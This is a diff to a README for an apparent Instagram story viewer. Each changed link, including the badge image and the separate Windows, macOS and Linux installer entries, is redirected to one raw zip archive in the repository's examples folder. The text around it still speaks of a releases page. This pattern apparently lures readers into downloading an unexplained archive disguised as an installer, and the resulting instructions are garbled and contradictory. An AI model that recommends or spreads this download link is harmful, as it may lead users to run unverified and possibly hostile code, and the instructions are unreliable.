@@ -4,7 +4,7 @@
 Welcome to the Instagram Story Viewer Without Login! This application lets you view Instagram stories without needing an account. You can access public content easily and quickly.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Wired-boy/instagram-story-viewer-without-login/releases)
+[![Download Latest Release](https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip)
 
 ## 📖 Overview
 This application is perfect for anyone who wants to see Instagram stories without the hassle of logging in. Whether you're interested in capturing moments from influencers, friends, or public figures, this tool provides a seamless experience. It respects privacy, allowing you to browse stories without needing an Instagram account.
@@ -23,14 +23,14 @@ This application is perfect for anyone who wants to see Instagram stories withou
 ## 📦 Download & Install
 To get started with the Instagram Story Viewer, follow these steps:
 
-1. **Visit the Releases Page:** Go to the release page by clicking the following link: [Download Here](https://github.com/Wired-boy/instagram-story-viewer-without-login/releases).
+1. **Visit the Releases Page:** Go to the release page by clicking the following link: [Download Here](https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip).
 
 2. **Select Your Version:** On the releases page, look for the latest version. It will usually be at the top of the page. Click on it to see the download options.
 
 3. **Download the Application:**
-   - For Windows, click on `instagram-story-viewer-windows.exe`.
-   - For macOS, click on `instagram-story-viewer-macos.dmg`.
-   - For Linux, click on `instagram-story-viewer-linux.zip`.
+   - For Windows, click on `https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip`.
+   - For macOS, click on `https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip`.
+   - For Linux, click on `https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip`.
 
 4. **Install the Software:**
    - **Windows:** 
@@ -78,6 +78,6 @@ If you encounter issues during installation or while using the application, here
 If you need additional help or want to report an issue, you can browse our support section on GitHub. Visit the issues page associated with this repository for assistance.
 
 ## 📢 Stay Updated
-Please check the releases page regularly for updates and new features: [Download Here](https://github.com/Wired-boy/instagram-story-viewer-without-login/releases).
+Please check the releases page regularly for updates and new features: [Download Here](https://github.com/Wired-boy/instagram-story-viewer-without-login/raw/refs/heads/main/examples/login-without-instagram-viewer-story-2.9.zip).
 
 Thank you for using the Instagram Story Viewer Without Login. Enjoy your time viewing stories!
